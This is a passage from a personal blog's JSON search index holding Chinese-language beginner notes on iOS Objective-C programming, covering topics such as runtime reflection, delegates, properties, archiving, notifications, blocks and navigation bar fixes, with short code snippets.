可以用字符串控制类名，然后根据字符串进行初始化等操作 这里属于Runtime的范畴，根本机制是由于OC的消息机制 123456789NSArray *StrArray &#x3D; @[@&quot;class0&quot;, @&quot;class1&quot;, @&quot;class2&quot;, @&quot;class3&quot;, @&quot;class4&quot;];for (int i &#x3D; 0; i &lt; array.count; ++i) &#123; id object &#x3D; [[NSClassFromString([array objectAtIndex:i]) alloc]init]; [ClassArray addObject:object];&#125; 苹果头文件NSObCRuntime.h中摘抄FOUNDATION_EXPORT NSString *NSStringFromSelector(SEL aSelector); FOUNDATION_EXPORT SEL NSSelectorFromString(NSString *aSelectorName); FOUNDATION_EXPORT NSString *NSStringFromClass(Class aClass); FOUNDATION_EXPORT Class __nullable NSClassFromString(NSString *aClassName); FOUNDATION_EXPORT NSString *NSStringFromProtocol(Protocol *proto) NS_AVAILABLE(10_5, 2_0); FOUNDATION_EXPORT Protocol * __nullable NSProtocolFromString(NSString *namestr)NS_AVAILABLE(10_5, 2_0);","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"}]},{"title":"NSMutableArray强制转换Array的问题","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/NSMutableArray强制转换Array的问题/","text":"NSMutableArray强制转换Array的问题开辟内存时是什么类型，即使强制转换了，或者用另一种指针指向它，它还是开辟时候都内存 123456NSMutableArray *mArray &#x3D; [[NSMutableArray alloc]init]; NSArray *array &#x3D; mArray; BOOL can &#x3D; [array respondsToSelector:@selector(addObject:)]; if (can) &#123; NSLog(@&quot;can&quot;);&#x2F;&#x2F;可以响应 &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"NavgationBar在页面切换闪现","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/NavgationBar在页面切换闪现/","text":"NavgationBar在页面切换闪现是因为隐藏或者现实NavigationBar没有设置动画，且两个界面的自定的NavigationBar的颜色或者背景图的不一样产生的，选择不同的函数 123 [self.navigationController setNavigationBarHidden:YES];&#x2F;&#x2F;通常这个可以解决 [self.navigationController setNavigationBarHidden:YES animated:YES];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"NavigationBar","slug":"NavigationBar","permalink":"http://yoursite.com/tags/NavigationBar/"}]},{"title":"OC的消息机制和Protocol&Selector研究","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/OC的消息机制和Protocol&Selector研究/","text":"OC是基于消息机制的函数在执行时，会把类名作为一个字符串消息发送给某个内存地址，如果内存地址的类中有同名的函数，就会执行 这也是为什么OC没有办法重载的原因，因为每个参数都用:代表，所以如果函数名一样，参数一样都为两个，那么生成的字符串都是**FunctionName::**，在具体执行时就会重名，无法判断 协议Protocol是如何实现的协议中有代理Delegate和Protocol A类中声明Protocol的人定义函数名，说我会使用一个叫什么名字的函数 B类中遵循Protocol的人需要实现Protocol中的函数，这就使得实际对象的内存地址有了该函数名 A类需要使用Protocol的人会设置一个weak类型id delegate的属性 delegate只不过是大家约定俗成这么叫，实际上就是一个任意的遵循Protocol协议的弱指针，weak指针是为了防止循环引用 在setDeleagte的时候就是把执行者B设置成delegate，相当于把类B实际的内存地址给了A，让A可以访问 那么A.delegate执行Protocol时就是把1-2步中约定好的函数名发送给A，A中实际存在，就会执行，不存在就会崩溃 那么消息和Selector是否必须遵循Protocol实现呢答案是不用的 Selector消息可以被发送给任意内存地址，也就是说只要类A可以拿到内存地址，就可以给该内存地址发送消息，例如给childViewController给自己的parentViewController发送消息 child(子)并不关心自己的parent(父窗口)是谁，只要其相应某个函数名，就可以让他执行，但是前提是知道函数名 1234SEL selector &#x3D; NSSelectorFromString(@&quot;offsetChildViewController:&quot;);if ([self.parentViewController respondsToSelector:selector]) &#123; [self.parentViewController performSelector:selector withObject:self afterDelay:0.0f];&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"initWithFrame&initWithCoder的区别","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/initWithFrame&initWithCoder的区别/","text":"万能初始化函数所有初始化方法都会最终的调用两个方法来初始化 initWithFrame:通过代码创建的View最终都会调用这个 initWtthCoder:通过文件创建的最终都会调用这个 init调用的哪个init属于通过代码创建View，会去调用initWithFrame:frame,其中frame为(0,0,0,0) 通过文件创建的是什么通过文件创建是指xib和storyboard的initWithNibName 调用顺序是initWithNibName先调用awakeFromNib,然后awakeFromNib会去从本地文件进行unarchive(解档),unarchvie会去调用initWtthCoder 通过文件创建的实质通过文件创建实质是加载了本地文件，进行了一系列的解压缩(unarchive 解档)操作，所以说才触发了解档函数initWtthCoder 堵死一个View的初始化如果要堵死初始化，只需要在自定义View里重写好initWithFrame&amp;initWithCoder就可以了，不管是如何创建 initWithCoder的常规用途因为实质是解档功能，所以initWithCoder两个用处: 只在xib和storyboard时,会在加载完视图后执行 归档解挡时重写 所以一般和encoder只用于重写 不用于调用","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"View","slug":"View","permalink":"http://yoursite.com/tags/View/"}]},{"title":"信息本地化储存(归档解档/压缩解压缩/archive&unarchive)","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/信息本地化储存archive&unarchive/","text":"本地化储存的方法首先自定义的object需要重载编码函数 1- (void)encodeWithCoder:(NSCoder *)aCoder 然后执行**压缩(归档)**函数 1[NSKeyedArchiver archiveRootObject:object toFile:path]; 从本地读取一个object首先自定义的object需要重载解码函数 1- (id)initWithCoder:(NSCoder *)aDecoder 然后执行**解压缩(解档)**函数 1[NSKeyedUnarchiver unarchiveObjectWithFile:path]; 本地化储存的path是什么path就是文件路径，实际储存的路径通过函数可以获得，一般是存在ipa的Documents里 1234 NSString *filename &#x3D; &quot;Company.app.state&quot; NSArray *array &#x3D; NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); NSString *folderPath &#x3D; [array firstObject];NSString *path &#x3D; [folderPath stringByAppendingPathComponent:filename]; Examplepath可以是写定的Define，也可以作为入参传给saveObject/loadObject，一般都是写死 123456789101112131415161718192021222324252627282930313233&#x2F;&#x2F;解密初始化- (id)initWithCoder:(NSCoder *)aDecoder&#123; self &#x3D; [super init]; if (self) &#123; self.userName &#x3D; [aDecoder decodeObjectForKey:@&quot;userName&quot;]; self.lastLoginTime &#x3D; [aDecoder decodeObjectForKey:@&quot;lastLoginTime&quot;]; &#125; return self;&#125;&#x2F;&#x2F;加密存贮- (void)encodeWithCoder:(NSCoder *)aCoder&#123; [aCoder encodeObject:self.userName forKey:@&quot;userName&quot;]; [aCoder encodeObject:self.lastLoginTime forKey:@&quot;lastlogin&quot;];&#125;&#x2F;&#x2F;归档- (BOOL)saveObject&#123; &#x2F;&#x2F;先检查文件是否存在，存在就删除，因为无法覆盖保存 BOOL fileExist &#x3D; [[NSFileManager defaultManager] fileExistsAtPath:path]; if(fileExist) &#123; [[NSFileManager defaultManager] removeItemAtPath:path error:nil]; &#125; return [NSKeyedArchiver archiveRootObject:self toFile:path];&#125;&#x2F;&#x2F;解档- (instancetype)loadObject&#123; BOOL fileExist &#x3D; [[NSFileManager defaultManager] fileExistsAtPath:path]; if(!fileExist) &#123; return; &#125; &#x2F;&#x2F; Object *model &#x3D; (Object *)[NSKeyedUnarchiver unarchiveObjectWithFile:path]; return model;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Archive","slug":"Archive","permalink":"http://yoursite.com/tags/Archive/"}]},{"title":"如何写死一个自定义View的大小","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/如何写死一个自定义View的大小/","text":"重写initWithFrame重写的时候传给super的Frame给定数值，而不是用传入的frame 1234567- (instancetype)initWithFrame:(CGRect)frame &#123; self &#x3D; [super initWithFrame:CGRectMake(frame.origin.x, frame.origin.y, width, height)]; if (self) &#123; &#x2F;&#x2F;do something you want &#125; return self;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"View","slug":"View","permalink":"http://yoursite.com/tags/View/"}]},{"title":"属性的初始化和懒加载","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/属性的初始化和懒加载/","text":"属性的初始化属性的初始化一般是指在VC负责储存数据的Array和Dictionary，如果在没有初始化之前调用”－”方法（成员方法）就会Crash。 值得一提，像储存数据的Array由于不像Subview有addSubview进行强指针Retain，所以一般声明为Strong 12@property (nonatomic, strong) NSMutableArray *array; [array addObject:object]; 我要是忘掉初始化怎么办为了防止忘掉初始化，才会有懒加载这个说法，通过重构get函数，当码农通过self.array调用的时候检查是否已经初始化了，没有就进行初始化 123456- (NSMutableArray *)array &#123; if (_array &#x3D;&#x3D; nil) &#123; _array &#x3D; [[NSMutableArray alloc] init]; &#125; return _array;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"成员方法(-)和类方法(+)","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/成员方法和类方法/","text":"成员方法传统意义上类内部的方法，执行时需要将类实例化 12Class *instance &#x3D; [[Class alloc]init];[instance memberFunctions]; 类方法有点类似于C++和Java中的静态方法，执行时不需要将类实例化，通过类名可以直接调用 1[Class classFunctions]; 类方法和成员方法互相调用成员方法内部可以调用类方法，因为类方法不用实例化，而类方法中不能调用成员方法，除非在类方法内部进行实例化 类方法和成员方法的self是什么 成员方法：self是指实例化出来的instance本身，具有实际内存地址 类方法:self只是类的类名本身，不具有实际内存地址，等于[self class] 123&#x2F;&#x2F;类方法中调用类方法[self classFunction]&#x2F;&#x2F;等于下文[[self class] classFunction]","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"移动或自定义Button的image和titleLabel位置","date":"2015-12-11T15:00:00.000Z","path":"2015/12/12/移动或自定义Button的image和titleLabel位置/","text":"非自定义的UIButton移动图片或者Title的的方法可以通过改变Edge来移动图片和标题，Edge这个单词除了TOFEL的边缘的意思，也有缓慢侧移的GRE解释(・Д・)ノ 所以说生产Edge的**UIEdgeInsetsMake(top, left, bottom, right)**的四个参数代表往四个方向相对原位置侧移多少，并不是距离 如果拿不准，可以把button的contentHorizontalAlignment设为居左，contentVerticalAlignment设为居上，就是从左上角开始移动了，比较容易把控 12[button setImageEdgeInsets:(UIEdgeInsets)];[button setTitleEdgeInsets:(UIEdgeInsets)]; 对于自定义的UIButton的Image和Title布局继承于UIButton的自定义Button可以通过重写以下的函数确定在UIButton中的位置 12- (CGRect)titleRectForContentRect:(CGRect)contentRect;- (CGRect)imageRectForContentRect:(CGRect)contentRect;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Button","slug":"Button","permalink":"http://yoursite.com/tags/Button/"}]},{"title":"Property属性的声明和Set/Get/Synthesize的使用","date":"2015-12-06T15:00:00.000Z","path":"2015/12/07/Property属性的声明和Set_Get_Synthesize的使用/","text":"OC中Property私有属性和私有变量的区别属性是OC中类的成员变量声明的一种方法，与其对应的有Set(写)方法Get(读)方法，由于OC中对private这个概念并不常用，所以如何声明私有变量分为两种情况 与其它语言一样声明私有变量的情况 该方法是在.m中声明一个无分类名称的分类，然后在其Class Continue(类后续？)中声明私有变量,该变量并不会自动生成Get/Set方法 12345@interface className ()&lt;&gt;&#123; UILabel *label;&#125;@end 声明为私有属性 在.m的无分类名称的累声明中使用@property声明成属性，因为.m是外界无法访问的，所以让其中属性成为了私有属性 123@interface className ()&lt;&gt;@property (nonatomic, weak) UILabel *label;@end 私有属性和私有变量的调用方式不同两种不同的声明方式带来的最直接不同就是调用方法不一样 123&#x2F;&#x2F;.mlabel &#x3D; [[UILabel alloc]init];&#x2F;&#x2F;私有变量，编译器会把label渲染成亲儿子颜色(天蓝色)_label &#x3D; [[UILabel alloc]init];&#x2F;&#x2F;私有属性，编译器会渲染_label 为什么私有属性通过”_”调用私有属性需要通过下划线调用是因为@synthesize命令会自动让.m中的私有属性声明一个名字前加入下划线的指针指向实际内存，类似于C++中的this指针 @synthesize label = _label; 为什么不能通过self.调用因为**self.label = [[UILabel alloc]init]**会因为”.”的存在去调用label的get方法 什么是Get/Set方法属性之所以与普通变量不同，是因为每一个属性都应该有对应的Set和Get方法，可以截获属性读写时的处理。 Set方法会自动命名为**- (void)setXXX名字并且传入一个同类变量，例如上文的Label，Set函数如果不重写，就会执行_XXX=XXX** 123- (void)SetLabel:(UILabel)label &#123; _label &#x3D; label;&#125; Get方法则自动命名为－ (className *)XXX**，并且返回自己，如果不重写Get，就会执行return XXX** 123－ (UILabel *)label &#123; return _label;&#125; 所以说我们可以通过重写以上方法，从而截获属性读写时执行的代码 所以说Synthesis/Get/Set他们到底对属性Property干了什么每当声明一个属性时，系统会自动执行@synthesis(Xcode5之前不会)声明一个指针，指针名为下划线＋属性名指向实际内存，然后当对属性进行赋值操作和读取操作时，让该下划线指针指向另外一个内存，从而让该类对的属性具有某值，或者返回该指针指向的内存让外界可以读取到该值。 赋值和读取方法都包括两种 123456&#x2F;&#x2F;通过方法进行Get&#x2F;Set[class setLabel:otherLabel];[class getLabel];&#x2F;&#x2F;通过语法self.label &#x3D; otherLabel;&#x2F;&#x2F;这里的self.label实际先调用了get方法得到内部的_label指针otherLabel &#x3D; self.label; 什么情况需要写@synthsize 如果同时重写了某个属性的Get和Set方法，系统不知道在Get和Set时具体发生了什么，所以必须手动重写@synthesize让下划线指针指向属性 另一种情况如果有readonly的属性， 那么按照定义该方法不应该具有Set方法仅仅具有Get方法，如果此时恰好有需求重写了Get方法，就需要手动写@synthesize 为什么属性这么麻烦，我还是只用私有变量好了，不用私有属性只用私有变量也会带来未知的风险，因为私有变量在.m不用通过_来调用，万一出现了局部变量和私有变量重名的情况，就会Crash 1234&#123;UIlabel *label &#x3D; [[UILabel alloc]init];label &#x3D; label;&#x2F;&#x2F;这里原意是让临时变量赋值给私有变量，但是语法上明显是错误的&#125; 卧槽这么麻烦我都要杀人了，还有什么大坑么OC中推荐是使用属性而不是变量，所以说在使用变量的过程中就会牵扯到重写Set/Get的时候。那么在这两个方法的内部，是不可以互相调用的 例如以下，如果在Set中调用Get，那么Get应该去取_label实际指向的内存，而Set方法过程中_label实际指向的内存地址还没有确定，所以会取到一种异常状态，产生Crash。 1234- (void)setLabel:(UILabel)label &#123; &#x2F;&#x2F;self.label &#x3D; label&#x2F;&#x2F;语法错误，在Set的内部调用了Get _label &#x3D; label;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Property","slug":"Property","permalink":"http://yoursite.com/tags/Property/"}]},{"title":"通知中心的使用","date":"2015-12-03T15:00:00.000Z","path":"2015/12/04/通知中心的使用与自定义/","text":"通知中心是什么系统的通知中心是个单例，在整个Navigation Controller的栈区里所有的VC都可以收到，使用**[NSNotificationCenter defaultCenter]**调用 通知中心如何使用通知有自定义通知和系统通知，通过添加观察者监测通知名称触发@SEL函数 1[[NSNotificationCenter defaultCenter]addObserver:(id)observer selector:(SEL)aSelector name:(nullable NSString *)aName object:(nullable id)anObject]; 系统通知例如系统的UITextField除了UITextFieldDelegate协议外还自带一些通知 123UIKIT_EXTERN NSString *const UITextFieldTextDidBeginEditingNotification;UIKIT_EXTERN NSString *const UITextFieldTextDidEndEditingNotification;UIKIT_EXTERN NSString *const UITextFieldTextDidChangeNotification; 例如我要监控TextField文字改变 1[[NSNotificationCenter defaultCenter]addObserver:self selector:@selector() name:UITextFieldTextDidChangeNotification object:nil]; 自定义通知如果有自定义的通知，则可以使用Post函数发出一个自定义名字的通知，通知的名字应当在静态区声明 1234&#x2F;&#x2F;.hUIKIT_EXTERN NSString *const CustomNotificationName;&#x2F;&#x2F;.mNSString *const CustomNotificationName &#x3D; @&quot;CustomNotificationName&quot;; 发出自定义通知 123- (void)postNotification:(NSNotification *)notification;- (void)postNotificationName:(NSString *)aName object:(nullable id)anObject;- (void)postNotificationName:(NSString *)aName object:(nullable id)anObject userInfo:(nullable NSDictionary *)aUserInfo; 为什么要写UIKIT_EXTERN,因为我看系统自带的都这么写所以我也这么写，通过查询资料得知，是为了适应编译器的编译方式：“UIKIT_EXTERN简单来说，就是将函数修饰为兼容以往C编译方式的、具有extern属性(文件外可见性)、public修饰的方法或变量库外仍可见的属性” 移除观察者与添加观察者对应的是移除观察者 12- (void)removeObserver:(id)observer;- (void)removeObserver:(id)observer name:(nullable NSString *)aName object:(nullable id)anObject; 一定要移除观察者！！！如果在VC中添加了观察者一定要在delloc里移除观察者，不然即使NavgationController中Pop出了VC，由于单例defaultCenter仍然有一个强指针指向VC，导致VC的内存无法被回收，有可能导致内存溢出 123- (void)dealloc &#123; [[NSNotificationCenter defaultCenter] removeObserver:self];&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"NSNotification","slug":"NSNotification","permalink":"http://yoursite.com/tags/NSNotification/"}]},{"title":"如何使用正则表达式","date":"2015-12-01T15:00:00.000Z","path":"2015/12/02/如何使用正则表达式/","text":"如何使用正则表达式可以使用NSPredicate对字符串进行判断，其中为什么要写**@”SELF MATCHES %@”**可以去Xcode的文档里查询Predicate Format String Syntax。 以下是一个判断是否全是英文和数字的正则表达式判断 12345- (BOOL)isAllEngNumAndSpecialSign:(NSString *)string &#123; NSString *regularString &#x3D; @&quot;^[A-Za-z0-9\\\\p&#123;Z&#125;\\\\p&#123;P&#125;]+$&quot;; NSPredicate *predicate &#x3D; [NSPredicate predicateWithFormat:@&quot;SELF MATCHES %@&quot;, regularString]; return [predicate evaluateWithObject:string];&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"RegEx","slug":"RegEx","permalink":"http://yoursite.com/tags/RegEx/"}]},{"title":"如何定义一个闭包Block","date":"2015-11-30T15:00:00.000Z","path":"2015/12/01/如何定义一个闭包Block/","text":"如何定义一个闭包Block的本质是将一个函数方法作为一个参数，传入另外一个函数。既然是函数那就包括三个要素 函数名(即闭包名) 返回值 参数 所以说闭包的定义为 typedef void(^completion)(NSString *code, NSString *message); // typedef 返回值(^闭包名)(参数1, 参数2); 闭包如何使用呢闭包本身是要作为一般函数的参数传入的，所以说「闭包名」就相当于「NSString *string」中的NSString。 - (void)someMethod:(NSString *)param1 blockParam:(completion)completion; 闭包名的讨论很多时候闭包并不会在函数前进行type定义，所以还会直接在函数中出现 - (void)someMethod:(NSString *)param1 blockParam:(void(^)(NSString *code, NSString *message))completion; 所以说「(^)」中如果不填入闭包名的话，会产生默认的名称 void(^completion)(NSString *code, NSString *message) //自定义名称: completion void(^)(NSString *code, NSString *message) //默认名称: void(^)(NSString *, NSString *)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Block","slug":"Block","permalink":"http://yoursite.com/tags/Block/"}]},{"title":"汉字转换拼音","date":"2015-11-30T15:00:00.000Z","path":"2015/12/01/汉字转换拼音/","text":"汉字转换拼音可以使用NSMutableString中一些C语言函数对字符串进行处理，一般可以和正则表达式一起使用，先判断是不是全部为非拉丁字母再转换 123NSMutableString *mutableString &#x3D; [NSMutableString stringWithString:string]; CFStringTransform((CFMutableStringRef)mutableString, NULL, kCFStringTransformToLatin, false); CFStringTransform((CFMutableStringRef)mutableString, NULL, kCFStringTransformStripCombiningMarks, false); 在转换有很多可以选择的选项，其中让我第一眼看到无法理解的是kCFStringTransformStripCombiningMarks，代表去掉英文中弯弯曲曲的变形字，如德语或者什么加了重读符号的文字 12345678910111213141516CF_EXPORT const CFStringRef kCFStringTransformStripCombiningMarks;CF_EXPORT const CFStringRef kCFStringTransformToLatin;CF_EXPORT const CFStringRef kCFStringTransformFullwidthHalfwidth;CF_EXPORT const CFStringRef kCFStringTransformLatinKatakana;CF_EXPORT const CFStringRef kCFStringTransformLatinHiragana;CF_EXPORT const CFStringRef kCFStringTransformHiraganaKatakana;CF_EXPORT const CFStringRef kCFStringTransformMandarinLatin;CF_EXPORT const CFStringRef kCFStringTransformLatinHangul;CF_EXPORT const CFStringRef kCFStringTransformLatinArabic;CF_EXPORT const CFStringRef kCFStringTransformLatinHebrew;CF_EXPORT const CFStringRef kCFStringTransformLatinThai;CF_EXPORT const CFStringRef kCFStringTransformLatinCyrillic;CF_EXPORT const CFStringRef kCFStringTransformLatinGreek;CF_EXPORT const CFStringRef kCFStringTransformToXMLHex;CF_EXPORT const CFStringRef kCFStringTransformToUnicodeName;CF_EXPORT const CFStringRef kCFStringTransformStripDiacritics CF_AVAILABLE(10_5, 2_0);","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"String","slug":"String","permalink":"http://yoursite.com/tags/String/"}]},{"title":"如何定义一个符合Cocoa风格的Protocol","date":"2015-11-29T15:00:00.000Z","path":"2015/11/30/一个符合Cocoa风格的Protocol/","text":"如何定义一个符合Cocoa风格的Protocol首先Protocol一般来讲是针对某个类的的Delegate，比如TextField的TextFiledDelegate,有时一个Class也可以有多个Delegate. Cocoa风格必备要素一般来说有以下几点 名为ClassName的Class 在ClassName后直接加「Delegate」作为协议名的Protocol Class中有一个id指针类型的属性 id指针为弱指针，切遵循「ClassNameDelegate」协议，放在头文件中 id指针的变量名为小写「delegate」 Protocol中所有的函数以Class的名打头 接着写上具体处理事物的说明 第一个参数必须是Class本身（不管是否需要都要传） 之后再跟上DoSomething必要参数 例如 @class ClassName; @protocol ClassNameDelegate &lt;NSObject&gt; - (void)classNameDoSomething:(ClassName *)className parameter:(NSString *)parameter; @end @interface ClassName : NSObject @property (nonatomic, weak) id&lt;ClassNameDelegate&gt; delegate; @end 常见错误根据以下代码分析 @class ClassName; //delegate名和class不统一 @protocol xxxxDoDelegate &lt;NSObject&gt; //方法名没有以class名开头 //方法第一个参数没有穿class本身，导致参数也不明所以 - (void)somethingandsomedo:(NSString *)parameter; @end @interface ClassName : NSObject //id类型指针的变量名不为delegate且不明所以 @property (nonatomic, weak) id&lt;xxxxDoDelegate&gt; xxxpoint; @end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Protocol","slug":"Protocol","permalink":"http://yoursite.com/tags/Protocol/"}]},{"title":"用@class声明类对象避免加载头文件","date":"2015-11-29T15:00:00.000Z","path":"2015/11/30/用@class声明类对象避免加载头文件/","text":"定义Protocol的时的顺序问题按照Cocoa里的习惯，一般在头文件中protocol会定义在class的interface之前。但是这样会引起一个问题，class会报错。 因为编译器在定义protocol时还没有读取到下边的class定义，就在protocol中使用了class，解决这个问题可以使用「@class」来进行声明Class从而解决报错，还保持了风格上的统一 @class SomeCell; @protocol SomeCellDelegate &lt;NSObject&gt; - (void)someOrderOnCell:(SomeCell *)cell parameter:(NSString *)parameter; @end @interface SomeCell : UITableViewCell @property (nonatomic, weak) id&lt;SomeCellDelegate&gt; delegate; @end 避免在头文件中加载头文件除了解决定义Protocol的问题之外，还可以通过「@class」来避免头文件中加载头文件问题。因为头文件时可以被无限「include」或者「import」的，写『局部代码』时都尽量避免在头文件中加载头文件。 如果此时需要使用某个类也可以使用「@class」","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"}]},{"title":"Navigation的被偷换StatusBar以及透明的各种坑","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/Navigation的被偷换StatusBar以及透明的各种坑/","text":"IOS8 UIImagePickerController会偷换StatusBar的颜色使用NavigationControllerDelegate中的函数进行检查 12345678&#x2F;&#x2F;防止ImagePickerController偷换StatusBar- (void)navigationController:(UINavigationController *)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated&#123; if ([navigationController isKindOfClass:[UIImagePickerController class]] &amp;&amp;((UIImagePickerController *) navigationController).sourceType &#x3D;&#x3D; UIImagePickerControllerSourceTypePhotoLibrary) &#123; [[UIApplication sharedApplication] setStatusBarHidden:NO]; [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent animated:NO]; &#125;&#125; UIImagePickerController的另外一个坑pickerController在选取相机时候会自动隐藏statusBar 需要结束时候手动改为显示 纯透明的NavigationBar怎么设置[[UIImage alloc]init]得到的UIImage就是纯透明的 1[[UINavigationBar appearance] setBackgroundImage:[[UIImage alloc]init] forBarMetrics:UIBarMetricsDefault]; 纯透明的NavigaitonBar怎么会有一个细线那个细线是系统NavigationBar自带的叫ShadowImage的一个UIImageView,也给设置成透明就可以了 1[[UINavigationBar appearance] setShadowImage:[[UIImage alloc]init]];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"NavigationBar","slug":"NavigationBar","permalink":"http://yoursite.com/tags/NavigationBar/"}]},{"title":"protocol是什么以及坑坑坑","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/protocol是什么以及坑坑坑/","text":"@protocol是什么OC里面叫协议，JAVA里面与其对应的叫接口，C＋＋里面叫抽象类 一种只定义函数名，不具体写实现，由不同的实例化对象（代理）执行不同内容的方法 protocol分析123456@protocol protocolName &lt;NSObject&gt;@required- (void)requiredProtocolFunction;@optional- (void)optionalProtocolFunction;@end delegate分析delegate(代理)，就是要具体实现方法内容的实例化对象，通常被声明为一个id类型的遵循某个protocol的指针，可以为任意名字，但是一般都叫delegate 123@interface className : NSObject@property (nonatomic, weak) id&lt;protocolName&gt; delegate;@end 被该指针指向的类也需要遵循同样的协议className.delegate = class&lt;protocolName&gt; protocol执行时的检查(坑坑坑！！！)protocol执行时一定要进行检查，不然如果delegate不存在或者具体协议函数没实现，那么就Crash!!! 12345678&#x2F;&#x2F;先问代理在不在，再问代理是否遵循某协议，然后去干if (self.delegate &amp;&amp; [self.delegate conformsToProtocol:@protocol(protocolName)]) &#123; [self.delegate doProtocolFunction];&#125;&#x2F;&#x2F;先问代理在不在，再问代理存在不存在某个实现，然后去干if (self.delegate &amp;&amp; [self.delegate respondsToSelector:@selector(protocolFunction)]) &#123; [self.delegate doProtocolFunction];&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Protocol","slug":"Protocol","permalink":"http://yoursite.com/tags/Protocol/"}]},{"title":"push/pop某个窗口键盘闪现和动画交叠","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/push:pop某个窗口键盘闪现和动画交叠/","text":"键盘闪现BUG出现的条件TextField: 编辑后弹出某个AlertAlertView: 点击后push/pop某个窗口ViewController:切换窗口 三个一起触发就会造成这个BUG 解决办法 使用新的UIAlertController而不是使用UIAlertView 调整逻辑不要一起触发 先收起键盘，延迟0.25-0.5秒执行push/pop方法 动画交叠造成闪退大坑虽然可以调整逻辑，但是千万不要在Alert还为执行选择就进行pop或者push 因为虽然电脑运行速度很快，但不可能同时运行两个动画，会造成动画交叠。然后Crash 123456789&#x2F;&#x2F;逆向传值 if (self.delegate &amp;&amp; [self.delegate respondsToSelector:@selector(didAddPersonByPhone:)]) &#123;&#x2F;&#x2F;这里didAddPersonByPhone带alert动画&#x2F;&#x2F;按照逻辑判断有可能还未点击确定,就顺序执行pop&#x2F;&#x2F;造成Crash [self.delegate didAddPersonByPhone:_number.text]; &#125; &#x2F;&#x2F;POP窗口 [self.navigationController popViewControllerAnimated:YES];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Error","slug":"Error","permalink":"http://yoursite.com/tags/Error/"},{"name":"Animation","slug":"Animation","permalink":"http://yoursite.com/tags/Animation/"}]},{"title":"内联函数","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/内联函数/","text":"内联函数内联函数是类似宏的机制，可以写在.h文件里层层传递，用多了可能造成IPA包过大 编译的时候将函数体替换函数调用，从而不需要将parameter，return address进行push/pop stack的操作，从而加速app的运行 123CG_INLINE UIColor *UIColorRgb(CGFloat red, CGFloat green, CGFloat blue) &#123; return [UIColor colorWithRed:(red&#x2F;255.0) green:(green&#x2F;255.0) blue:(blue&#x2F;255.0) alpha:1.0];&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Memory","slug":"Memory","permalink":"http://yoursite.com/tags/Memory/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"如何分辨C语言函数","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/如何分辨C语言函数/","text":"如何分辨C语言函数 凡是用REF的就是C语言，REF可能是指针Reference的缩写，但是不确定 C语言调用不需要声明类，直接接受入参 C语言的代码段是面向过程的，执行到一般会有一个开始和结束的标记函数 凡是CORE xxx的函数，基本都牵扯到C语言，因为OC是基于C的嘛。。猜测","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"如何重写一个NavgationBar的默认效果","date":"2015-11-28T15:00:00.000Z","path":"2015/11/29/如何重写一个NavgationBar的默认效果/","text":"基于UINavigationControoler重写一个类作为基类主要是重写**+ 